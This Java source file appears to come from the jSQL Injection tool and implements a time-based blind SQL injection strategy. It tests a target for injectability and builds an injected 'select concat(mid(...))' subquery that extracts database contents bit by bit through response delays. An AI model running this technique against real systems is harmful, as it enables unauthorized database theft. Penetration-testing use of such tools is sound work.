package com.jsql.model.pattern.strategy;

import com.jsql.exception.PreparationException;
import com.jsql.exception.StoppableException;
import com.jsql.model.Interruptable;
import com.jsql.model.Stoppable;
import com.jsql.model.bean.Request;
import com.jsql.model.blind.ConcreteTimeInjection;
import com.jsql.view.GUIMediator;

public class TimeStrategy implements IInjectionStrategy {
	
	private ConcreteTimeInjection time;
//	private TimeInjection time;
	
	private boolean isApplicable = false;
	
	@Override
	public void checkApplicability() throws PreparationException {
		GUIMediator.model().sendMessage("Time based test...");
		
		time = new ConcreteTimeInjection();
//		time = new TimeInjection();
		isApplicable = time.isInjectable();
//		isApplicable = time.isTimeInjectable();
		
		if(isApplicable)
			activate();
		else
			deactivate();
	}

	@Override
	public boolean isApplicable() {
        return isApplicable;
	}
	
	@Override
	public void activate() {
		Request request = new Request();
        request.setMessage("MarkTimebasedVulnerable");
        GUIMediator.model().interact(request);
	}

	@Override
	public void deactivate() {
        Request request = new Request();
        request.setMessage("MarkTimebasedInvulnerable");
        GUIMediator.model().interact(request);
	}

	@Override
	public String inject(String sqlQuery, String startPosition, Interruptable interruptable, Stoppable stoppable) throws StoppableException {
		return time.inject("(" +
                "select+" +
	                "concat(" +
		                "0x53514c69," +
		                "mid(" +
			                "("+sqlQuery+")," +
			                startPosition+"," +
			                "65536" +
		                ")" +
	                ")"+
                ")", interruptable, stoppable);
	}

	@Override
	public void applyStrategy() {
		GUIMediator.model().sendMessage("Using timebased injection...");
		GUIMediator.model().applyStrategy(this);
		
        Request request = new Request();
        request.setMessage("MessageBinary");
        request.setParameters("Asking server \"Is this bit true?\", if delay does not exceed 5 seconds then response is true.\n");
        GUIMediator.model().interact(request);
		
		Request request2 = new Request();
        request2.setMessage("MarkTimeStrategy");
        GUIMediator.model().interact(request2);
	}
}
